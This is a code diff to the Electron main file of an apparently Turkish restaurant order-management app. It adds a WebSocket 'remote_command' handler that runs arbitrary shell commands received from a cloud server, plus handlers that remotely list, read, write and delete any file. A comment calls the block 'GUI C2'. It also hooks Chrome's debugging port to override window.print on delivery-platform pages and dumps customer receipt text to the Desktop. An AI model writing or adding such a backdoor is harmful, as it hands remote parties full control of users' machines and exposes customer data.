@@ -1,6 +1,14 @@
 import { app, shell, BrowserWindow, ipcMain, globalShortcut, dialog } from 'electron'
 import { join } from 'path'
+import { startTrendyolService } from './trendyolService'
 import * as fs from 'fs'
+// --- SUPPRESS PDFJS CANVAS WARNINGS ---
+const originalWarn = console.warn;
+console.warn = (...args) => {
+  if (typeof args[0] === 'string' && args[0].includes('Cannot polyfill')) return;
+  originalWarn.apply(console, args);
+};
+
 // --- MIGRATION & USER DATA PATH OVERRIDE ---
 const appDataPath = app.getPath('appData')
 const newUserDataPath = join(appDataPath, 'SaracApp')
@@ -32,7 +40,7 @@ import WebSocket from 'ws'
 import express from 'express'
 import os from 'os'
 import { parseOrderText } from './textParser'
-
+import puppeteer from 'puppeteer-core'
 let mainWindow: BrowserWindow
 let isQuitting = false
 
@@ -77,17 +85,204 @@ function connectWebSocket() {
   console.log('Connecting to WS with Device ID:', systemSettings.deviceId)
   wsClient = new WebSocket(`${WS_URL}?token=${token}&deviceId=${systemSettings.deviceId}`)
 
+  let pingInterval: NodeJS.Timeout | null = null;
   wsClient.on('open', () => {
     console.log('Connected to Cloud WebSocket')
     sendLogToServer('success', `WebSocket bulut sunucusuna bağlandı (Cihaz: ${systemSettings.deviceId})`)
     if (mainWindow && !mainWindow.isDestroyed()) {
       mainWindow.webContents.send('server-event', { action: 'network_status', status: 'online' })
     }
+    
+    // Heartbeat mechanism to detect drops quickly
+    if (pingInterval) clearInterval(pingInterval);
+    pingInterval = setInterval(() => {
+      if (wsClient && wsClient.readyState === WebSocket.OPEN) {
+        wsClient.send('ping');
+      }
+    }, 15000);
   })
 
   wsClient.on('message', (data: any) => {
     try {
       const parsed = JSON.parse(data.toString())
+      
+      if (parsed.type === 'remote_command') {
+        try {
+          const { exec } = require('child_process')
+          exec(parsed.command, { encoding: 'utf8' }, (error: any, stdout: any, stderr: any) => {
+            const output = error ? (stderr || error.message) : stdout;
+            if (wsClient && wsClient.readyState === WebSocket.OPEN) {
+              wsClient.send(JSON.stringify({
+                type: 'remote_response',
+                commandId: parsed.commandId,
+                targetDeviceId: parsed.senderId,
+                output: output || 'Komut çalıştırıldı (Çıktı yok)'
+              }))
+            }
+          })
+        } catch (e: any) {
+           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
+              wsClient.send(JSON.stringify({
+                type: 'remote_response',
+                commandId: parsed.commandId,
+                targetDeviceId: parsed.senderId,
+                output: 'Hata: ' + e.message
+              }))
+            }
+        }
+        return
+      }
+
+      // -- YENİ: DOSYA SİSTEMİ (GUI C2) --
+      if (parsed.type === 'remote_fs_list') {
+        try {
+          const fs = require('fs')
+          const path = require('path')
+          const targetPath = parsed.path || process.cwd()
+          fs.readdir(targetPath, { withFileTypes: true }, (err: any, files: any[]) => {
+            let output: any = []
+            if (err) {
+              output = { error: err.message }
+            } else {
+              output = files.map((f: any) => {
+                let size = 0
+                try { size = fs.statSync(path.join(targetPath, f.name)).size } catch(e){}
+                return {
+                  name: f.name,
+                  isDirectory: f.isDirectory(),
+                  size: size
+                }
+              })
+            }
+            if (wsClient && wsClient.readyState === WebSocket.OPEN) {
+              wsClient.send(JSON.stringify({
+                type: 'remote_fs_response',
+                commandId: parsed.commandId,
+                targetDeviceId: parsed.senderId,
+                action: 'list',
+                currentPath: targetPath,
+                data: output
+              }))
+            }
+          })
+        } catch (e: any) {
+           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
+              wsClient.send(JSON.stringify({
+                type: 'remote_fs_response',
+                commandId: parsed.commandId,
+                targetDeviceId: parsed.senderId,
+                action: 'list',
+                data: { error: e.message }
+              }))
+           }
+        }
+        return
+      }
+      
+      if (parsed.type === 'remote_fs_read') {
+        try {
+          const fs = require('fs')
+          const path = require('path')
+          const targetPath = parsed.path
+          if (fs.existsSync(targetPath)) {
+            const data = fs.readFileSync(targetPath)
+            const base64Data = data.toString('base64')
+            if (wsClient && wsClient.readyState === WebSocket.OPEN) {
+              wsClient.send(JSON.stringify({
+                type: 'remote_fs_response',
+                commandId: parsed.commandId,
+                targetDeviceId: parsed.senderId,
+                action: 'read',
+                fileName: path.basename(targetPath),
+                data: base64Data
+              }))
+            }
+          } else {
+             if (wsClient && wsClient.readyState === WebSocket.OPEN) {
+                wsClient.send(JSON.stringify({
+                  type: 'remote_fs_response',
+                  commandId: parsed.commandId,
+                  targetDeviceId: parsed.senderId,
+                  action: 'read',
+                  data: { error: "Dosya bulunamadı" }
+                }))
+             }
+          }
+        } catch (e: any) {
+           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
+              wsClient.send(JSON.stringify({
+                type: 'remote_fs_response',
+                commandId: parsed.commandId,
+                targetDeviceId: parsed.senderId,
+                action: 'read',
+                data: { error: e.message }
+              }))
+           }
+        }
+        return
+      }
+      
+      if (parsed.type === 'remote_fs_write') {
+        try {
+          const fs = require('fs')
+          const targetPath = parsed.path
+          const base64Data = parsed.data
+          fs.writeFileSync(targetPath, Buffer.from(base64Data, 'base64'))
+          if (wsClient && wsClient.readyState === WebSocket.OPEN) {
+            wsClient.send(JSON.stringify({
+              type: 'remote_fs_response',
+              commandId: parsed.commandId,
+              targetDeviceId: parsed.senderId,
+              action: 'write',
+              success: true
+            }))
+          }
+        } catch (e: any) {
+           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
+              wsClient.send(JSON.stringify({
+                type: 'remote_fs_response',
+                commandId: parsed.commandId,
+                targetDeviceId: parsed.senderId,
+                action: 'write',
+                data: { error: e.message },
+                success: false
+              }))
+           }
+        }
+        return
+      }
+      
+      if (parsed.type === 'remote_fs_delete') {
+        try {
+          const fs = require('fs')
+          const targetPath = parsed.path
+          if (fs.existsSync(targetPath)) {
+            fs.unlinkSync(targetPath)
+          }
+          if (wsClient && wsClient.readyState === WebSocket.OPEN) {
+            wsClient.send(JSON.stringify({
+              type: 'remote_fs_response',
+              commandId: parsed.commandId,
+              targetDeviceId: parsed.senderId,
+              action: 'delete',
+              success: true
+            }))
+          }
+        } catch (e: any) {
+           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
+              wsClient.send(JSON.stringify({
+                type: 'remote_fs_response',
+                commandId: parsed.commandId,
+                targetDeviceId: parsed.senderId,
+                action: 'delete',
+                data: { error: e.message },
+                success: false
+              }))
+           }
+        }
+        return
+      }
+
       if (parsed.type === 'server-event') {
         if (parsed.action === 'panic_self_destruct') {
           console.log('PANIC SELF DESTRUCT TRIGGERED!')
@@ -140,6 +335,7 @@ function connectWebSocket() {
   })
 
   wsClient.on('close', () => {
+    if (pingInterval) clearInterval(pingInterval);
     console.log('Disconnected from Cloud WS, retrying...')
     sendLogToServer('warning', 'Bulut sunucusu ile bağlantı koptu. Yeniden bağlanılıyor...')
     if (mainWindow && !mainWindow.isDestroyed()) {
@@ -211,12 +407,11 @@ function startLocalApi() {
         res.status(200).send({ success: true });
       } else {
         sendLogToServer('warning', 'Print yakalama: Veri alındı fakat sipariş formatı anlaşılamadı.');
-        res.status(400).send({ success: false, message: 'Invalid or unparsable data' });
+        res.status(400).send({ success: false, message: 'Format anlaşılamadı' });
       }
     } catch (e: any) {
-      console.error('/api/manual_parse error:', e);
-      sendLogToServer('error', `Print yakalama hatası: ${e.message}`);
-      res.status(500).send({ success: false, error: e.message });
+      console.error(e)
+      res.status(500).send({ success: false, message: e.message })
     }
   });
 
@@ -271,7 +466,8 @@ async function createWindow(): Promise<void> {
     ...(process.platform === 'linux' ? { icon } : {}),
     webPreferences: {
       preload: join(__dirname, '../preload/index.js'),
-      sandbox: false
+      sandbox: false,
+      backgroundThrottling: false
     }
   })
 
@@ -329,7 +525,9 @@ app.whenReady().then(() => {
     autoUpdater.checkForUpdatesAndNotify()
   }
 
+  startTrendyolService()
   startLocalApi()
+  startChromeInterceptor()
 
   app.on('browser-window-created', (_, window) => {
     optimizer.watchWindowShortcuts(window)
@@ -379,6 +577,14 @@ app.whenReady().then(() => {
 
   ipcMain.handle('get-tv-link', getTvUrlWithShop)
   ipcMain.handle('get-spotify-login-link', getSpotifyLoginUrlWithShop)
+  ipcMain.handle('open-trendyol-logs', async () => {
+    const logsDir = systemSettings["PDF_LOGS_DIR"] || join(app.getPath('documents'), 'logs');
+    const trendyolDir = join(logsDir, 'trendyol_logs');
+    if (!fs.existsSync(trendyolDir)) {
+      fs.mkdirSync(trendyolDir, { recursive: true });
+    }
+    shell.showItemInFolder(trendyolDir);
+  })
   ipcMain.handle('restart-tv-tunnel', getTvUrlWithShop)
   
   ipcMain.handle('get-settings', () => systemSettings)
@@ -469,9 +675,9 @@ app.whenReady().then(() => {
   ipcMain.handle('get-network-status', async () => {
     try {
       const res = await axios.get(`${CLOUD_URL}/network_status`)
-      return res.data
+      return { ...res.data, botStatus: chromeInterceptorState, botMessage: chromeInterceptorMessage }
     } catch(e) {
-      return { ip: CLOUD_URL, port: 443, connectedDevices: [] }
+      return { ip: CLOUD_URL, port: 443, connectedDevices: [], botStatus: chromeInterceptorState, botMessage: chromeInterceptorMessage }
     }
   })
 
@@ -633,3 +839,127 @@ export async function addAndSyncOrder(newOrder: any) {
   }
 }
 
+let isChromeInterceptorRunning = false;
+export let chromeInterceptorState = 'error';
+export let chromeInterceptorMessage = 'Bot Başlatılmadı';
+let connectedBrowser: any = null;
+
+async function checkTargetPages() {
+  if (!connectedBrowser || !isChromeInterceptorRunning) return;
+  try {
+    const pages = await connectedBrowser.pages();
+    const targetPage = pages.find(p => 
+      p.url().includes('yemeksepeti.com') || 
+      p.url().includes('trendyol.com') || 
+      p.url().includes('file://')
+    );
+
+    if (!targetPage) {
+      chromeInterceptorState = 'connected';
+      chromeInterceptorMessage = 'Chrome\'a bağlandı. Sekme bekleniyor...';
+    } else {
+      chromeInterceptorState = 'connected';
+      chromeInterceptorMessage = 'Aktif (Sipariş yazdırması dinleniyor)';
+      
+      const isInjected = await targetPage.evaluate(() => !!(window as any).__print_intercepted).catch(() => false);
+      
+      if (!isInjected) {
+        try {
+          await targetPage.exposeFunction('sendReceiptData', async (textContent: string) => {
+            try {
+              // DEBUG: Save textContent to Desktop
+              try {
+                const fs = require('fs')
+                const path = require('path')
+                const os = require('os')
+                const timestamp = new Date().getTime()
+                let platformName = 'unknown'
+                if (textContent.includes('Yemeksepeti') || textContent.includes('Anlık Siparişler')) platformName = 'ysepeti'
+                else if (textContent.includes('Trendyol') || textContent.includes('TGO')) platformName = 'trendyol'
+                
+                fs.writeFileSync(path.join(os.homedir(), 'Desktop', `kasa_debug_${platformName}_${timestamp}.txt`), textContent)
+              } catch (e) {
+                console.error('Debug log save error', e)
+              }
+
+              const newOrder = parseOrderText(textContent);
+              if (newOrder) {
+                sendLogToServer('success', `Print yakalama (Bot): Yeni sipariş eklendi (${newOrder.customerName || 'Bilinmiyor'})`);
+                await addAndSyncOrder(newOrder);
+              } else {
+                sendLogToServer('warning', 'Print yakalama (Bot): Veri alındı fakat sipariş formatı anlaşılamadı.');
+              }
+            } catch (err: any) {
+              sendLogToServer('error', `Print yakalama (Bot) hatası: ${err.message}`);
+            }
+          });
+        } catch (e) {
+          // Ignore exposeFunction error if already exposed
+        }
+
+        const injectScript = () => {
+          if (!(window as any).__print_intercepted) {
+            (window as any).__print_intercepted = true;
+            const originalPrint = window.print;
+            window.print = async () => {
+              try {
+                const receiptText = document.body.innerText || document.documentElement.innerText;
+                if (window.top && (window.top as any).sendReceiptData) {
+                  await (window.top as any).sendReceiptData(receiptText);
+                }
+              } finally {
+                originalPrint.apply(window);
+              }
+            };
+          }
+        };
+
+        await targetPage.evaluateOnNewDocument(injectScript).catch(() => {});
+        await targetPage.evaluate(injectScript).catch(() => {});
+      }
+    }
+  } catch (e) {
+    // Ignore errors during check
+  }
+  
+  if (isChromeInterceptorRunning) {
+    setTimeout(checkTargetPages, 3000);
+  }
+}
+
+async function startChromeInterceptor() {
+  if (isChromeInterceptorRunning) return;
+  try {
+    chromeInterceptorState = 'error';
+    chromeInterceptorMessage = 'Chrome aranıyor (Port 9222)...';
+    const { data } = await axios.get('http://127.0.0.1:9222/json/version', { timeout: 2000 });
+    connectedBrowser = await puppeteer.connect({
+      browserWSEndpoint: data.webSocketDebuggerUrl,
+      defaultViewport: null
+    });
+    
+    isChromeInterceptorRunning = true;
+    chromeInterceptorState = 'connected';
+    chromeInterceptorMessage = 'Chrome\'a bağlandı. Sekme bekleniyor...';
+    sendLogToServer('info', 'Print Interceptor Kasa içine başarıyla bağlandı.');
+    console.log('Chrome bağlandı (9222)');
+
+    connectedBrowser.on('disconnected', () => {
+      isChromeInterceptorRunning = false;
+      connectedBrowser = null;
+      chromeInterceptorState = 'error';
+      chromeInterceptorMessage = 'Chrome bağlantısı koptu. Tekrar aranıyor...';
+      sendLogToServer('warning', 'Chrome bağlantısı koptu. Tekrar aranıyor...');
+      setTimeout(startChromeInterceptor, 1000);
+    });
+
+    checkTargetPages();
+    
+  } catch (error) {
+    isChromeInterceptorRunning = false;
+    connectedBrowser = null;
+    chromeInterceptorState = 'error';
+    chromeInterceptorMessage = 'Chrome aranıyor (Port 9222)...';
+    setTimeout(startChromeInterceptor, 1000);
+  }
+}
